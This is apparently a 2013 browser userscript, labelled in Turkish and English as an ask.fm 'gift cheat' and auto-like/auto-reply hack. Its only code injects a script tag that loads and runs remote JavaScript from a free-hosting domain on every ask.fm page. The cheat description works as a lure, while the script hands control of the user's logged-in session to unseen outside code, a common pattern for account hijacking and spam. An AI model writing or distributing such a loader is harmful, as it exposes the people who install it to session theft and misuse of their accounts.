// ==UserScript==
// @name			Ask.fm Hediye Hilesi 42 adet | Ask.fm Gift Cheat in 42 ~ 2013 ~ KANITLI / proof
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			3.0.2
// @copyright		        http://ask.fm/
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack / Ask.Fm Tools
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif
// Version numero 2
// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://askfmtool882.zz.mu/Ask.fm%2014102013.js');
}